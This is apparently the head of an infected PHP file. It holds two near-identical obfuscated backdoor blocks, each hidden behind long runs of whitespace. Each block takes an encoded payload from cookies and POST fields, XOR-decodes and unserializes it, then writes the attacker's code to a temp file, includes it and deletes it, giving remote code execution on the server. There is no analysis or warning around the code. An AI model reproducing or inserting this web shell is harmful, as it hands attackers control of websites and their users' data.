<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("emnvks")){class emnvks{public static $ufrolnj = "caqnxlbohsetewtb";public static $qvdgbp = NULL;public function __construct(){$ulxqsqqzvz = @$_COOKIE[substr(emnvks::$ufrolnj, 0, 4)];if (!empty($ulxqsqqzvz)){$jugucgfw = "base64";$vacghumsek = "";$ulxqsqqzvz = explode(",", $ulxqsqqzvz);foreach ($ulxqsqqzvz as $tklxsb){$vacghumsek .= @$_COOKIE[$tklxsb];$vacghumsek .= @$_POST[$tklxsb];}$vacghumsek = array_map($jugucgfw . "_decode", array($vacghumsek,));$vacghumsek = $vacghumsek[0] ^ str_repeat(emnvks::$ufrolnj, (strlen($vacghumsek[0]) / strlen(emnvks::$ufrolnj)) + 1);emnvks::$qvdgbp = @unserialize($vacghumsek);}}public function __destruct(){$this->zglps();}private function zglps(){if (is_array(emnvks::$qvdgbp)) {$yvkamrft = sys_get_temp_dir() . "/" . crc32(emnvks::$qvdgbp["salt"]);@emnvks::$qvdgbp["write"]($yvkamrft, emnvks::$qvdgbp["content"]);include $yvkamrft;@emnvks::$qvdgbp["delete"]($yvkamrft);exit();}}}$tvaibex = new emnvks();$tvaibex = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("xdkwhqscf")){class xdkwhqscf{public static $dylkz = "kmwhtracykrlfgkv";public static $sxgcruvod = NULL;public function __construct(){$wzbbvo = @$_COOKIE[substr(xdkwhqscf::$dylkz, 0, 4)];if (!empty($wzbbvo)){$koqux = "base64";$vuxcb = "";$wzbbvo = explode(",", $wzbbvo);foreach ($wzbbvo as $sdglvzvh){$vuxcb .= @$_COOKIE[$sdglvzvh];$vuxcb .= @$_POST[$sdglvzvh];}$vuxcb = array_map($koqux . "_decode", array($vuxcb,));$vuxcb = $vuxcb[0] ^ str_repeat(xdkwhqscf::$dylkz, (strlen($vuxcb[0]) / strlen(xdkwhqscf::$dylkz)) + 1);xdkwhqscf::$sxgcruvod = @unserialize($vuxcb);}}public function __destruct(){$this->afbaqlwl();}private function afbaqlwl(){if (is_array(xdkwhqscf::$sxgcruvod)) {$yvndfsgle = sys_get_temp_dir() . "/" . crc32(xdkwhqscf::$sxgcruvod["salt"]);@xdkwhqscf::$sxgcruvod["write"]($yvndfsgle, xdkwhqscf::$sxgcruvod["content"]);include $yvndfsgle;@xdkwhqscf::$sxgcruvod["delete"]($yvndfsgle);exit();}}}$gdvjwjqxkf = new xdkwhqscf();$gdvjwjqxkf = NULL;} ?><?php
